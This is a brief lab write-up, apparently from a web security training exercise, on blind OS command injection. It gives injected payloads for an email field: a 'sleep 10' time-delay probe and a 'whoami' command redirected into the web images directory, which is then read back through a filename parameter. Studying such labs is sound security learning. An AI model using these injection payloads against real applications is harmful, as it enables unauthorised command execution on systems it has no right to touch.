Lab #3: Blind OS command injection with output redirection

End goal: 
- Exploit blind command injection and redirect the output from the whoami command to the /var/www/images
- Retrieve the content of the file

Analysis:

1. Confirm blind command injection

email=email + encode( sleep 10 #)

email field

2. Check where images are store

/var/www/images

3. Redirect output to file

email=email + encode( & whoami > /var/www/images/whoami.txt #)

4. Check if file was created

image?filename=whoami.txt

